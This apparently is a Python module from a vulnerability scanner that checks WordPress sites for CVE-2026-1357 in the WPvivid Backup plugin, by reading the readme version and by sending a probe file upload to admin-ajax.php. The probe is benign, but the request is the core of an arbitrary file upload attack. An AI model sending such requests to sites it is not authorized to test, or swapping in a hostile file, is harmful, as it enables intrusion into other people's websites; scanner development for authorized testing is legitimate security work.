# Made by Sn0w8ird

from __future__ import annotations

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20261357WPvivid(WordPressModule):
    """WPvivid Backup & Migration — remote version check vs fixed metadata."""

    name = "CVE-2026-1357"
    severity = 9.8
    affected_versions = ["<=0.9.123 per research inventory — confirm against vendor SA"]
    cwe = "CWE-434 / CWE-22 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/wpvivid-backuprestore/readme.txt",
        "/wp-content/plugins/wpvivid-backup-main/readme.txt",
    )
    slug_hint = "wpvivid"
    fixed_in_version = "0.9.124"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """Multipart upload-style POST (authorized lab targets — captures real response for reports)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            files = {"Filedata": ("cpointed-wpvivid-probe.txt", b"<!-- cpointed authorized upload probe -->\n", "text/plain")}
            data = {
                "action": "wpvivid_upload_import_files",
                "chunk": "0",
            }
            r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": "wpvivid_upload_import_files",
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append({"action": "wpvivid_upload_import_files", "error": str(exc)})
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
